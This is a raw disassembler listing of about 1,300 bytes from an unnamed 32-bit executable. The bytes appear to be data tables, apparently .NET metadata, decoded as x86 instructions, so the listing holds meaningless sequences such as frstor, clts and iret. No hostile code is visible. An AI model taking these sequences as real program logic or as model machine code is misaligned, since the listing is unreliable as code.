  405cb7:	00 28                	add    %ch,(%eax)
  405cb9:	1b 2a                	sbb    (%edx),%ebp
  405cbb:	06                   	push   %es
  405cbc:	0a 00                	or     (%eax),%al
  405cbe:	dd 20                	frstor (%eax)
  405cc0:	9f                   	lahf
  405cc1:	1e                   	push   %ds
  405cc2:	0a 00                	or     (%eax),%al
  405cc4:	6a 1b                	push   $0x1b
  405cc6:	9f                   	lahf
  405cc7:	1e                   	push   %ds
  405cc8:	06                   	push   %es
  405cc9:	00 d6                	add    %dl,%dh
  405ccb:	25 30 00 06 00       	and    $0x60030,%eax
  405cd0:	b5 1d                	mov    $0x1d,%ch
  405cd2:	2a 06                	sub    (%esi),%al
  405cd4:	06                   	push   %es
  405cd5:	00 c7                	add    %al,%bh
  405cd7:	15 2a 06 0a 00       	adc    $0xa062a,%eax
  405cdc:	ad                   	lods   %ds:(%esi),%eax
  405cdd:	0f 9f 1e             	setg   (%esi)
  405ce0:	06                   	push   %es
  405ce1:	00 3b                	add    %bh,(%ebx)
  405ce3:	1b 2a                	sbb    (%edx),%ebp
  405ce5:	06                   	push   %es
  405ce6:	0a 00                	or     (%eax),%al
  405ce8:	cb                   	lret
  405ce9:	0f 9f 1e             	setg   (%esi)
  405cec:	06                   	push   %es
  405ced:	00 4d 26             	add    %cl,0x26(%ebp)
  405cf0:	30 00                	xor    %al,(%eax)
  405cf2:	16                   	push   %ss
  405cf3:	00 f2                	add    %dh,%dl
  405cf5:	1f                   	pop    %ds
  405cf6:	67 0b 06 00 fc       	or     -0x400,%eax
  405cfb:	16                   	push   %ss
  405cfc:	30 00                	xor    %al,(%eax)
  405cfe:	06                   	push   %es
  405cff:	00 6f 0f             	add    %ch,0xf(%edi)
  405d02:	2a 06                	sub    (%esi),%al
  405d04:	06                   	push   %es
  405d05:	00 a1 18 2a 06 06    	add    %ah,0x6062a18(%ecx)
  405d0b:	00 4b 0e             	add    %cl,0xe(%ebx)
  405d0e:	2a 06                	sub    (%esi),%al
  405d10:	06                   	push   %es
  405d11:	00 c2                	add    %al,%dl
  405d13:	1d 2a 06 06 00       	sbb    $0x6062a,%eax
  405d18:	31 1b                	xor    %ebx,(%ebx)
  405d1a:	2a 06                	sub    (%esi),%al
  405d1c:	16                   	push   %ss
  405d1d:	00 4a 1b             	add    %cl,0x1b(%edx)
  405d20:	b2 1e                	mov    $0x1e,%dl
  405d22:	1a 00                	sbb    (%eax),%al
  405d24:	68 1d ab 22 1a       	push   $0x1a22ab1d
  405d29:	00 6b 1a             	add    %ch,0x1a(%ebx)
  405d2c:	ab                   	stos   %eax,%es:(%edi)
  405d2d:	22 8b 01 01 1e 00    	and    0x1e0101(%ebx),%cl
  405d33:	00 1a                	add    %bl,(%edx)
  405d35:	00 91 21 ab 22 06    	add    %dl,0x622ab21(%ecx)
  405d3b:	00 88 1e 06 19 06    	add    %cl,0x619061e(%eax)
  405d41:	00 4b 00             	add    %cl,0x0(%ebx)
  405d44:	06                   	push   %es
  405d45:	19 06                	sbb    %eax,(%esi)
  405d47:	00 fd                	add    %bh,%ch
  405d49:	18 06                	sbb    %al,(%esi)
  405d4b:	19 06                	sbb    %eax,(%esi)
  405d4d:	00 6d 00             	add    %ch,0x0(%ebp)
  405d50:	06                   	push   %es
  405d51:	19 06                	sbb    %eax,(%esi)
  405d53:	00 af 1c f2 25 06    	add    %ch,0x625f21c(%edi)
  405d59:	00 34 19             	add    %dh,(%ecx,%ebx,1)
  405d5c:	f2 25 06 00 64 10    	repnz and $0x10640006,%eax
  405d62:	06                   	push   %es
  405d63:	19 06                	sbb    %eax,(%esi)
  405d65:	00 91 19 06 19 1e    	add    %dl,0x1e190619(%ecx)
  405d6b:	00 14 1a             	add    %dl,(%edx,%ebx,1)
  405d6e:	50                   	push   %eax
  405d6f:	20 06                	and    %al,(%esi)
  405d71:	00 84 26 b5 17 06 00 	add    %al,0x617b5(%esi,%eiz,1)
  405d78:	cf                   	iret
  405d79:	17                   	pop    %ss
  405d7a:	b5 17                	mov    $0x17,%ch
  405d7c:	06                   	push   %es
  405d7d:	00 7d 0f             	add    %bh,0xf(%ebp)
  405d80:	b5 17                	mov    $0x17,%ch
  405d82:	06                   	push   %es
  405d83:	00 85 0c 06 19 06    	add    %al,0x619060c(%ebp)
  405d89:	00 5b 0f             	add    %bl,0xf(%ebx)
  405d8c:	3e 14 0a             	ds adc $0xa,%al
  405d8f:	00 81 1d 30 00 0a    	add    %al,0xa00301d(%ecx)
  405d95:	00 10                	add    %dl,(%eax)
  405d97:	21 30                	and    %esi,(%eax)
  405d99:	00 06                	add    %al,(%esi)
  405d9b:	00 c0                	add    %al,%al
  405d9d:	0d 30 00 43 00       	or     $0x430030,%eax
  405da2:	3e 1e                	ds push %ds
  405da4:	00 00                	add    %al,(%eax)
  405da6:	12 00                	adc    (%eax),%al
  405da8:	e9 0e 71 1c 06       	jmp    0x65ccebb
  405dad:	00 0b                	add    %cl,(%ebx)
  405daf:	00 4c 0b 06          	add    %cl,0x6(%ebx,%ecx,1)
  405db3:	00 a8 19 06 19 06    	add    %ch,0x6190619(%eax)
  405db9:	00 0f                	add    %cl,(%edi)
  405dbb:	26 3f                	es aas
  405dbd:	1a 06                	sbb    (%esi),%al
  405dbf:	00 da                	add    %bl,%dl
  405dc1:	10 06                	adc    %al,(%esi)
  405dc3:	19 06                	sbb    %eax,(%esi)
  405dc5:	00 49 1e             	add    %cl,0x1e(%ecx)
  405dc8:	06                   	push   %es
  405dc9:	19 06                	sbb    %eax,(%esi)
  405dcb:	00 37                	add    %dh,(%edi)
  405dcd:	0f 06                	clts
  405dcf:	19 22                	sbb    %esp,(%edx)
  405dd1:	00 57 1b             	add    %dl,0x1b(%edi)
  405dd4:	08 1d 22 00 c8 1f    	or     %bl,0x1fc80022
  405dda:	08 1d 22 00 2f 1d    	or     %bl,0x1d2f0022
  405de0:	08 1d 12 00 27 1d    	or     %bl,0x1d270012
  405de6:	ef                   	out    %eax,(%dx)
  405de7:	1e                   	push   %ds
  405de8:	22 00                	and    (%eax),%al
  405dea:	e0 1f                	loopne 0x405e0b
  405dec:	08 1d 06 00 85 1f    	or     %bl,0x1f850006
  405df2:	f2 25 06 00 c0 1a    	repnz and $0x1ac00006,%eax
  405df8:	06                   	push   %es
  405df9:	19 06                	sbb    %eax,(%esi)
  405dfb:	00 8c 1f f2 25 12 00 	add    %cl,0x1225f2(%edi,%ebx,1)
  405e02:	e1 1c                	loope  0x405e20
  405e04:	f2 25 06 00 c4 18    	repnz and $0x18c40006,%eax
  405e0a:	f2 25 06 00 84 00    	repnz and $0x840006,%eax
  405e10:	f2 25 06 00 aa 1a    	repnz and $0x1aaa0006,%eax
  405e16:	06                   	push   %es
  405e17:	19 06                	sbb    %eax,(%esi)
  405e19:	00 0d 19 f2 25 06    	add    %cl,0x625f219
  405e1f:	00 90 0e f2 25 06    	add    %dl,0x625f20e(%eax)
  405e25:	00 54 0e f2          	add    %dl,-0xe(%esi,%ecx,1)
  405e29:	25 06 00 6b 19       	and    $0x196b0006,%eax
  405e2e:	f2 25 06 00 6f 0e    	repnz and $0xe6f0006,%eax
  405e34:	f2 25 06 00 93 1a    	repnz and $0x1a930006,%eax
  405e3a:	f2 25 06 00 45 1d    	repnz and $0x1d450006,%eax
  405e40:	06                   	push   %es
  405e41:	19 06                	sbb    %eax,(%esi)
  405e43:	00 8a 25 06 19 06    	add    %cl,0x6190625(%edx)
  405e49:	00 a9 20 ef 1e 06    	add    %ch,0x61eef20(%ecx)
  405e4f:	00 14 0f             	add    %dl,(%edi,%ecx,1)
  405e52:	06                   	push   %es
  405e53:	19 06                	sbb    %eax,(%esi)
  405e55:	00 36                	add    %dh,(%esi)
  405e57:	0c f2                	or     $0xf2,%al
  405e59:	25 06 00 64 00       	and    $0x640006,%eax
  405e5e:	06                   	push   %es
  405e5f:	19 06                	sbb    %eax,(%esi)
  405e61:	00 02                	add    %al,(%edx)
  405e63:	0f 06                	clts
  405e65:	19 06                	sbb    %eax,(%esi)
  405e67:	00 68 0f             	add    %ch,0xf(%eax)
  405e6a:	06                   	push   %es
  405e6b:	19 06                	sbb    %eax,(%esi)
  405e6d:	00 c8                	add    %cl,%al
  405e6f:	20 2a                	and    %ch,(%edx)
  405e71:	06                   	push   %es
  405e72:	06                   	push   %es
  405e73:	00 df                	add    %bl,%bh
  405e75:	10 2a                	adc    %ch,(%edx)
  405e77:	06                   	push   %es
  405e78:	0a 00                	or     (%eax),%al
  405e7a:	d1 18                	rcrl   $1,(%eax)
  405e7c:	fe                   	(bad)
  405e7d:	19 0a                	sbb    %ecx,(%edx)
  405e7f:	00 80 0e fe 19 00    	add    %al,0x19fe0e(%eax)
  405e85:	00 00                	add    %al,(%eax)
  405e87:	00 98 00 00 00 00    	add    %bl,0x0(%eax)
  405e8d:	00 01                	add    %al,(%ecx)
  405e8f:	00 01                	add    %al,(%ecx)
  405e91:	00 01                	add    %al,(%ecx)
  405e93:	00 10                	add    %dl,(%eax)
  405e95:	00 b9 06 f5 13 05    	add    %bh,0x513f506(%ecx)
  405e9b:	00 01                	add    %al,(%ecx)
  405e9d:	00 01                	add    %al,(%ecx)
  405e9f:	00 81 01 10 00 f7    	add    %al,-0x8ffefff(%ecx)
  405ea5:	15 f5 13 05 00       	adc    $0x513f5,%eax
  405eaa:	01 00                	add    %eax,(%eax)
  405eac:	03 00                	add    (%eax),%eax
  405eae:	81 01 10 00 86 06    	addl   $0x6860010,(%ecx)
  405eb4:	33 13                	xor    (%ebx),%edx
  405eb6:	05 00 13 00 06       	add    $0x6001300,%eax
  405ebb:	00 00                	add    %al,(%eax)
  405ebd:	00 10                	add    %dl,(%eax)
  405ebf:	00 12                	add    %dl,(%edx)
  405ec1:	09 28                	or     %ebp,(%eax)
  405ec3:	07                   	pop    %es
  405ec4:	05 00 1e 00 24       	add    $0x24001e00,%eax
  405ec9:	00 00                	add    %al,(%eax)
  405ecb:	00 10                	add    %dl,(%eax)
  405ecd:	00 0d 03 b5 07 05    	add    %cl,0x507b503
  405ed3:	00 1e                	add    %bl,(%esi)
  405ed5:	00 26                	add    %ah,(%esi)
  405ed7:	00 81 01 10 00 88    	add    %al,-0x77ffefff(%ecx)
  405edd:	07                   	pop    %es
  405ede:	b5 07                	mov    $0x7,%ch
  405ee0:	05 00 1e 00 2d       	add    $0x2d001e00,%eax
  405ee5:	00 81 01 10 00 2c    	add    %al,0x2c001001(%ecx)
  405eeb:	16                   	push   %ss
  405eec:	b5 07                	mov    $0x7,%ch
  405eee:	05 00 1e 00 2f       	add    $0x2f001e00,%eax
  405ef3:	00 81 01 10 00 8a    	add    %al,-0x75ffefff(%ecx)
  405ef9:	09 b5 07 05 00 1e    	or     %esi,0x1e000507(%ebp)
  405eff:	00 30                	add    %dh,(%eax)
  405f01:	00 81 01 10 00 20    	add    %al,0x20001001(%ecx)
  405f07:	01 b5 07 05 00 1e    	add    %esi,0x1e000507(%ebp)
  405f0d:	00 36                	add    %dh,(%esi)
  405f0f:	00 81 01 10 00 db    	add    %al,-0x24ffefff(%ecx)
  405f15:	01 b5 07 05 00 1f    	add    %esi,0x1f000507(%ebp)
  405f1b:	00 38                	add    %bh,(%eax)
  405f1d:	00 02                	add    %al,(%edx)
  405f1f:	01 00                	add    %eax,(%eax)
  405f21:	00 7a 04             	add    %bh,0x4(%edx)
  405f24:	00 00                	add    %al,(%eax)
  405f26:	39 00                	cmp    %eax,(%eax)
  405f28:	1f                   	pop    %ds
  405f29:	00 3e                	add    %bh,(%esi)
  405f2b:	00 81 01 10 00 6c    	add    %al,0x6c001001(%ecx)
  405f31:	06                   	push   %es
  405f32:	b5 07                	mov    $0x7,%ch
  405f34:	05 00 23 00 3e       	add    $0x3e002300,%eax
  405f39:	00 81 01 10 00 ca    	add    %al,-0x35ffefff(%ecx)
  405f3f:	03 b5 07 05 00 23    	add    0x23000507(%ebp),%esi
  405f45:	00 41 00             	add    %al,0x0(%ecx)
  405f48:	81 01 10 00 89 05    	addl   $0x5890010,(%ecx)
  405f4e:	5e                   	pop    %esi
  405f4f:	17                   	pop    %ss
  405f50:	05 00 24 00 46       	add    $0x46002400,%eax
  405f55:	00 83 01 10 00 94    	add    %al,-0x6bffefff(%ebx)
  405f5b:	06                   	push   %es
  405f5c:	00 00                	add    %al,(%eax)
  405f5e:	05 00 25 00 4b       	add    $0x4b002500,%eax
  405f63:	00 01                	add    %al,(%ecx)
  405f65:	00 10                	add    %dl,(%eax)
  405f67:	00 26                	add    %ah,(%esi)
  405f69:	03 73 16             	add    0x16(%ebx),%esi
  405f6c:	05 00 26 00 4b       	add    $0x4b002600,%eax
  405f71:	00 81 01 10 00 7b    	add    %al,0x7b001001(%ecx)
  405f77:	1b 73 16             	sbb    0x16(%ebx),%esi
  405f7a:	05 00 2d 00 52       	add    $0x52002d00,%eax
  405f7f:	00 00                	add    %al,(%eax)
  405f81:	01 00                	add    %eax,(%eax)
  405f83:	00 cd                	add    %cl,%ch
  405f85:	00 00                	add    %al,(%eax)
  405f87:	00 05 00 2d 00 54    	add    %al,0x54002d00
  405f8d:	00 13                	add    %dl,(%ebx)
  405f8f:	01 00                	add    %eax,(%eax)
  405f91:	00 31                	add    %dh,(%ecx)
  405f93:	0e                   	push   %cs
  405f94:	00 00                	add    %al,(%eax)
  405f96:	51                   	push   %ecx
  405f97:	00 2e                	add    %ch,(%esi)
  405f99:	00 54 00 01          	add    %dl,0x1(%eax,%eax,1)
  405f9d:	00 10                	add    %dl,(%eax)
  405f9f:	00 21                	add    %ah,(%ecx)
  405fa1:	09 b2 03 05 00 2e    	or     %esi,0x2e000503(%edx)
  405fa7:	00 54 00 01          	add    %dl,0x1(%eax,%eax,1)
  405fab:	00 10                	add    %dl,(%eax)
  405fad:	00 82 03 b2 03 05    	add    %al,0x503b203(%edx)
  405fb3:	00 2f                	add    %ch,(%edi)
  405fb5:	00 5f 00             	add    %bl,0x0(%edi)
  405fb8:	01 00                	add    %eax,(%eax)
  405fba:	10 00                	adc    %al,(%eax)
  405fbc:	34 06                	xor    $0x6,%al
  405fbe:	b2 03                	mov    $0x3,%dl
  405fc0:	05 00 31 00 63       	add    $0x63003100,%eax
  405fc5:	00 01                	add    %al,(%ecx)
  405fc7:	00 10                	add    %dl,(%eax)
  405fc9:	00 04 0a             	add    %al,(%edx,%ecx,1)
  405fcc:	b2 03                	mov    $0x3,%dl
  405fce:	05 00 33 00 6a       	add    $0x6a003300,%eax
  405fd3:	00 01                	add    %al,(%ecx)
  405fd5:	01 00                	add    %eax,(%eax)
  405fd7:	00 96 09 b2 03 39    	add    %dl,0x3903b209(%esi)
  405fdd:	00 3a                	add    %bh,(%edx)
  405fdf:	00 95 00 00 00 10    	add    %dl,0x10000000(%ebp)
  405fe5:	00 42 03             	add    %al,0x3(%edx)
  405fe8:	b2 03                	mov    $0x3,%dl
  405fea:	05 00 47 00 95       	add    $0x95004700,%eax
  405fef:	00 00                	add    %al,(%eax)
  405ff1:	00 10                	add    %dl,(%eax)
  405ff3:	00 09                	add    %cl,(%ecx)
  405ff5:	13 b2 03 05 00 47    	adc    0x47000503(%edx),%esi
  405ffb:	00 99 00 81 01 10    	add    %bl,0x10018100(%ecx)
  406001:	00 f4                	add    %dh,%ah
  406003:	09 b2 03 05 00 47    	or     %esi,0x47000503(%edx)
  406009:	00 a2 00 00 01 00    	add    %ah,0x10000(%edx)
  40600f:	00 2b                	add    %ch,(%ebx)
  406011:	08 00                	or     %al,(%eax)
  406013:	00 05 00 47 00 a4    	add    %al,0xa4004700
  406019:	00 13                	add    %dl,(%ebx)
  40601b:	01 00                	add    %eax,(%eax)
  40601d:	00 0f                	add    %cl,(%edi)
  40601f:	0a 00                	or     (%eax),%al
  406021:	00 51 00             	add    %dl,0x0(%ecx)
  406024:	48                   	dec    %eax
  406025:	00 a4 00 16 00 43 06 	add    %ah,0x6430016(%eax,%eax,1)
  40602c:	12 00                	adc    (%eax),%al
  40602e:	16                   	push   %ss
  40602f:	00 02                	add    %al,(%edx)
  406031:	02 12                	add    (%edx),%dl
  406033:	00 16                	add    %dl,(%esi)
  406035:	00 a5 1b 12 00 16    	add    %ah,0x1600121b(%ebp)
  40603b:	00 01                	add    %al,(%ecx)
  40603d:	1c 12                	sbb    $0x12,%al
  40603f:	00 16                	add    %dl,(%esi)
  406041:	00 1f                	add    %bl,(%edi)
  406043:	16                   	push   %ss
  406044:	12 00                	adc    (%eax),%al
  406046:	16                   	push   %ss
  406047:	00 8c 08 12 00 16 00 	add    %cl,0x160012(%eax,%ecx,1)
  40604e:	c1 04 12 00          	roll   $0x0,(%edx,%edx,1)
  406052:	16                   	push   %ss
  406053:	00 07                	add    %al,(%edi)
  406055:	27                   	daa
  406056:	12 00                	adc    (%eax),%al
  406058:	16                   	push   %ss
  406059:	00 9a 0b 12 00 16    	add    %bl,0x1600120b(%edx)
  40605f:	00 0d 07 12 00 16    	add    %cl,0x16001207
  406065:	00 fc                	add    %bh,%ah
  406067:	0d 15 00 16 00       	or     $0x160015,%eax
  40606c:	e8 26 12 00 16       	call   0x16407297
  406071:	00 3d 18 19 00 16    	add    %bh,0x16001918
  406077:	00 a4 0a 12 00 16 00 	add    %ah,0x160012(%edx,%ecx,1)
  40607e:	cd 08                	int    $0x8
  406080:	12 00                	adc    (%eax),%al
  406082:	16                   	push   %ss
  406083:	00 59 16             	add    %bl,0x16(%ecx)
  406086:	12 00                	adc    (%eax),%al
  406088:	16                   	push   %ss
  406089:	00 27                	add    %ah,(%edi)
  40608b:	17                   	pop    %ss
  40608c:	12 00                	adc    (%eax),%al
  40608e:	16                   	push   %ss
  40608f:	00 63 1c             	add    %ah,0x1c(%ebx)
  406092:	12 00                	adc    (%eax),%al
  406094:	11 00                	adc    %eax,(%eax)
  406096:	91                   	xchg   %eax,%ecx
  406097:	0d 21 00 11 00       	or     $0x110021,%eax
  40609c:	76 0d                	jbe    0x4060ab
  40609e:	25 00 11 00 46       	and    $0x46001100,%eax
  4060a3:	0d 29 00 11 00       	or     $0x110029,%eax
  4060a8:	dc 0c 2d 00 11 00 5e 	fmull  0x5e001100(,%ebp,1)
  4060af:	0d 2d 00 11 00       	or     $0x11002d,%eax
  4060b4:	c1 0c 30 00          	rorl   $0x0,(%eax,%esi,1)
  4060b8:	11 00                	adc    %eax,(%eax)
  4060ba:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4060bb:	0c 34                	or     $0x34,%al
  4060bd:	00 31                	add    %dh,(%ecx)
  4060bf:	00 8a 0c 37 00 11    	add    %cl,0x1100370c(%edx)
  4060c5:	00 f8                	add    %bh,%al
  4060c7:	0c 30                	or     $0x30,%al
  4060c9:	00 11                	add    %dl,(%ecx)
  4060cb:	00 2c 0d 3a 00 11 00 	add    %ch,0x11003a(,%ecx,1)
  4060d2:	0e                   	push   %cs
  4060d3:	0d 34 00 16 00       	or     $0x160034,%eax
  4060d8:	41                   	inc    %ecx
  4060d9:	04 dc                	add    $0xdc,%al
  4060db:	00 06                	add    %al,(%esi)
  4060dd:	06                   	push   %es
  4060de:	72 0a                	jb     0x4060ea
  4060e0:	06                   	push   %es
  4060e1:	01 56 80             	add    %edx,-0x80(%esi)
  4060e4:	f5                   	cmc
  4060e5:	23 09                	and    (%ecx),%ecx
  4060e7:	01 56 80             	add    %edx,-0x80(%esi)
  4060ea:	62 02                	bound  %eax,(%edx)
  4060ec:	09 01                	or     %eax,(%ecx)
  4060ee:	56                   	push   %esi
  4060ef:	80 b3 01 09 01 31 00 	xorb   $0x0,0x31010901(%ebx)
  4060f6:	79 06                	jns    0x4060fe
  4060f8:	12 00                	adc    (%eax),%al
  4060fa:	16                   	push   %ss
  4060fb:	00 5c 03 30          	add    %bl,0x30(%ebx,%eax,1)
  4060ff:	01 16                	add    %edx,(%esi)
  406101:	00 2a                	add    %ch,(%edx)
  406103:	05 43 01 51 80       	add    $0x80510143,%eax
  406108:	41                   	inc    %ecx
  406109:	0b 3a                	or     (%edx),%edi
  40610b:	00 51 80             	add    %dl,-0x80(%ecx)
  40610e:	5f                   	pop    %edi
  40610f:	25 3a 00 51 80       	and    $0x8051003a,%eax
  406114:	32 18                	xor    (%eax),%bl
  406116:	3a 00                	cmp    (%eax),%al
  406118:	51                   	push   %ecx
  406119:	80 b7 08 3a 00 21 00 	xorb   $0x0,0x21003a08(%edi)
  406120:	58                   	pop    %eax
  406121:	18 29                	sbb    %ch,(%ecx)
  406123:	00 21                	add    %ah,(%ecx)
  406125:	00 ef                	add    %ch,%bh
  406127:	04 29                	add    $0x29,%al
  406129:	00 31                	add    %dh,(%ecx)
  40612b:	00 86 0a 29 00 33    	add    %al,0x3300290a(%esi)
  406131:	01 29                	add    %ebp,(%ecx)
  406133:	1c 8b                	sbb    $0x8b,%al
  406135:	01 11                	add    %edx,(%ecx)
  406137:	00 2b                	add    %ch,(%ebx)
  406139:	0a 8f 01 01 00 1d    	or     0x1d000101(%edi),%cl
  40613f:	02 30                	add    (%eax),%dh
  406141:	01 01                	add    %eax,(%ecx)
  406143:	00 ca                	add    %cl,%dl
  406145:	05 3a 00 01 00       	add    $0x1003a,%eax
  40614a:	1d 02 30 01 01       	sbb    $0x1013002,%eax
  40614f:	00 de                	add    %bl,%dh
  406151:	24 c7                	and    $0xc7,%al
  406153:	01 01                	add    %eax,(%ecx)
  406155:	00 37                	add    %dh,(%edi)
  406157:	08 12                	or     %dl,(%edx)
  406159:	00 01                	add    %al,(%ecx)
  40615b:	00 e1                	add    %ah,%cl
  40615d:	0b 12                	or     (%edx),%edx
  40615f:	00 01                	add    %al,(%ecx)
  406161:	00 dc                	add    %bl,%ah
  406163:	13 37                	adc    (%edi),%esi
  406165:	00 01                	add    %al,(%ecx)
  406167:	00 fd                	add    %bh,%ch
  406169:	04 02                	add    $0x2,%al
  40616b:	02 01                	add    (%ecx),%al
  40616d:	00 6b 01             	add    %ch,0x1(%ebx)
  406170:	c7 01 01 00 1d 02    	movl   $0x21d0001,(%ecx)
  406176:	30 01                	xor    %al,(%ecx)
  406178:	01 00                	add    %eax,(%eax)
  40617a:	87 01                	xchg   %eax,(%ecx)
  40617c:	06                   	push   %es
  40617d:	02 06                	add    (%esi),%al
  40617f:	06                   	push   %es
  406180:	72 0a                	jb     0x40618c
  406182:	3a 00                	cmp    (%eax),%al
  406184:	56                   	push   %esi
  406185:	80 39 02             	cmpb   $0x2,(%ecx)
  406188:	02 02                	add    (%edx),%al
  40618a:	56                   	push   %esi
  40618b:	80 47 0a 02          	addb   $0x2,0xa(%edi)
  40618f:	02 56 80             	add    -0x80(%esi),%dl
  406192:	39 25 02 02 56 80    	cmp    %esp,0x80560202
  406198:	70 09                	jo     0x4061a3
  40619a:	02 02                	add    (%edx),%al
  40619c:	56                   	push   %esi
  40619d:	80 11 25             	adcb   $0x25,(%ecx)
  4061a0:	02 02                	add    (%edx),%al
  4061a2:	56                   	push   %esi
  4061a3:	80 b0 00 02 02 56 80 	xorb   $0x80,0x56020200(%eax)
  4061aa:	7d 1c                	jge    0x4061c8
  4061ac:	02 02                	add    (%edx),%al
  4061ae:	56                   	push   %esi
  4061af:	80 50 04 02          	adcb   $0x2,0x4(%eax)
  4061b3:	02 56 80             	add    -0x80(%esi),%dl
  4061b6:	f5                   	cmc
  4061b7:	1b 02                	sbb    (%edx),%eax
  4061b9:	02 56 80             	add    -0x80(%esi),%dl
  4061bc:	20 24 02             	and    %ah,(%edx,%eax,1)
  4061bf:	02 56 80             	add    -0x80(%esi),%dl
  4061c2:	4c                   	dec    %esp
  4061c3:	21 02                	and    %eax,(%edx)
  4061c5:	02 56 80             	add    -0x80(%esi),%dl
  4061c8:	7f 15                	jg     0x4061df
  4061ca:	02 02                	add    (%edx),%al
  4061cc:	33 01                	xor    (%ecx),%eax
  4061ce:	0a 05 fd 02 08 26    	or     0x260802fd,%al
  4061d4:	00 00                	add    %al,(%eax)
  4061d6:	00 00                	add    %al,(%eax)
  4061d8:	96                   	xchg   %eax,%esi
  4061d9:	00 99 19 0a 00 01    	add    %bl,0x1000a19(%ecx)
  4061df:	00 78 20             	add    %bh,0x20(%eax)
  4061e2:	00 00                	add    %al,(%eax)
  4061e4:	00 00                	add    %al,(%eax)
  4061e6:	86 18                	xchg   %bl,(%eax)
  4061e8:	53                   	push   %ebx
  4061e9:	1e                   	push   %ds
  4061ea:	0e                   	push   %cs
  4061eb:	00 01                	add    %al,(%ecx)
  4061ed:	00 f8                	add    %bh,%al
  4061ef:	26 00 00             	add    %al,%es:(%eax)
  4061f2:	00 00                	add    %al,(%eax)
  4061f4:	96                   	xchg   %eax,%esi
  4061f5:	00 50 03             	add    %dl,0x3(%eax)
  4061f8:	1d 00 01 00 50       	sbb    $0x50000100,%eax
  4061fd:	28 00                	sub    %al,(%eax)
  4061ff:	00 00                	add    %al,(%eax)
  406201:	00 91 00 e6 0a 1d    	add    %dl,0x1d0ae600(%ecx)
  406207:	00 01                	add    %al,(%ecx)
  406209:	00 c0                	add    %al,%al
  40620b:	28 00                	sub    %al,(%eax)
  40620d:	00 00                	add    %al,(%eax)
  40620f:	00 91 18 59 1e 0a    	add    %dl,0xa1e5918(%ecx)
  406215:	00 01                	add    %al,(%ecx)
  406217:	00 80 20 00 00 00    	add    %al,0x20(%eax)
  40621d:	00 96 08 7a 22 3d    	add    %dl,0x3d227a08(%esi)
  406223:	00 01                	add    %al,(%ecx)
  406225:	00 87 20 00 00 00    	add    %al,0x20(%edi)
  40622b:	00 96 08 88 22 42    	add    %dl,0x42228808(%esi)
  406231:	00 01                	add    %al,(%ecx)
  406233:	00 8f 20 00 00 00    	add    %cl,0x20(%edi)
  406239:	00 96 08 5e 22 48    	add    %dl,0x48225e08(%esi)
  40623f:	00 02                	add    %al,(%edx)
  406241:	00 96 20 00 00 00    	add    %dl,0x20(%esi)
  406247:	00 96 08 6c 22 4d    	add    %dl,0x4d226c08(%esi)
  40624d:	00 02                	add    %al,(%edx)
  40624f:	00 9e 20 00 00 00    	add    %bl,0x20(%esi)
  406255:	00 91 08 36 1d 53    	add    %dl,0x531d3608(%ecx)
  40625b:	00 03                	add    %al,(%ebx)
  40625d:	00 a5 20 00 00 00    	add    %ah,0x20(%ebp)
  406263:	00 91 08 41 1d 58    	add    %dl,0x581d4108(%ecx)
  406269:	00 03                	add    %al,(%ebx)
  40626b:	00 ad 20 00 00 00    	add    %ch,0x20(%ebp)
  406271:	00 91 08 7d 13 5e    	add    %dl,0x5e137d08(%ecx)
  406277:	00 04 00             	add    %al,(%eax,%eax,1)
  40627a:	b4 20                	mov    $0x20,%ah
  40627c:	00 00                	add    %al,(%eax)
  40627e:	00 00                	add    %al,(%eax)
  406280:	91                   	xchg   %eax,%ecx
  406281:	08 8c 13 62 00 04 00 	or     %cl,0x40062(%ebx,%edx,1)
  406288:	bc 20 00 00 00       	mov    $0x20,%esp
  40628d:	00 91 08 f8 21 5e    	add    %dl,0x5e21f808(%ecx)
  406293:	00 05 00 c3 20 00    	add    %al,0x20c300
  406299:	00 00                	add    %al,(%eax)
  40629b:	00 91 08 03 22 62    	add    %dl,0x62220308(%ecx)
  4062a1:	00 05 00 cb 20 00    	add    %al,0x20cb00
  4062a7:	00 00                	add    %al,(%eax)
  4062a9:	00 91 08 3e 13 67    	add    %dl,0x67133e08(%ecx)
  4062af:	00 06                	add    %al,(%esi)
  4062b1:	00 d2                	add    %dl,%dl
  4062b3:	20 00                	and    %al,(%eax)
  4062b5:	00 00                	add    %al,(%eax)
  4062b7:	00 91 08 4c 13 6c    	add    %dl,0x6c134c08(%ecx)
  4062bd:	00 06                	add    %al,(%esi)
  4062bf:	00 da                	add    %bl,%dl
  4062c1:	20 00                	and    %al,(%eax)
  4062c3:	00 00                	add    %al,(%eax)
  4062c5:	00 96 08 52 0c 1d    	add    %dl,0x1d0c5208(%esi)
  4062cb:	00 07                	add    %al,(%edi)
  4062cd:	00 e1                	add    %ah,%cl
  4062cf:	20 00                	and    %al,(%eax)
  4062d1:	00 00                	add    %al,(%eax)
  4062d3:	00 96 08 62 0c 72    	add    %dl,0x720c6208(%esi)
  4062d9:	00 07                	add    %al,(%edi)
  4062db:	00 e9                	add    %ch,%cl
  4062dd:	20 00                	and    %al,(%eax)
  4062df:	00 00                	add    %al,(%eax)
  4062e1:	00 91 08 8d 0b 77    	add    %dl,0x770b8d08(%ecx)
  4062e7:	00 08                	add    %cl,(%eax)
  4062e9:	00 f0                	add    %dh,%al
  4062eb:	20 00                	and    %al,(%eax)
  4062ed:	00 00                	add    %al,(%eax)
  4062ef:	00 91 08 2c 14 67    	add    %dl,0x67142c08(%ecx)
  4062f5:	00 08                	add    %cl,(%eax)
  4062f7:	00 f7                	add    %dh,%bh
  4062f9:	20 00                	and    %al,(%eax)
  4062fb:	00 00                	add    %al,(%eax)
  4062fd:	00 91 08 35 14 6c    	add    %dl,0x6c143508(%ecx)
  406303:	00 08                	add    %cl,(%eax)
  406305:	00 ff                	add    %bh,%bh
  406307:	20 00                	and    %al,(%eax)
  406309:	00 00                	add    %al,(%eax)
  40630b:	00 96 08 e0 17 7b    	add    %dl,0x7b17e008(%esi)
  406311:	00 09                	add    %cl,(%ecx)
  406313:	00 06                	add    %al,(%esi)
  406315:	21 00                	and    %eax,(%eax)
  406317:	00 00                	add    %al,(%eax)
  406319:	00 96 08 ed 17 7f    	add    %dl,0x7f17ed08(%esi)
  40631f:	00 09                	add    %cl,(%ecx)
  406321:	00 0e                	add    %cl,(%esi)
  406323:	21 00                	and    %eax,(%eax)
  406325:	00 00                	add    %al,(%eax)
  406327:	00 96 08 30 15 1d    	add    %dl,0x1d153008(%esi)
  40632d:	00 0a                	add    %cl,(%edx)
  40632f:	00 15 21 00 00 00    	add    %dl,0x21
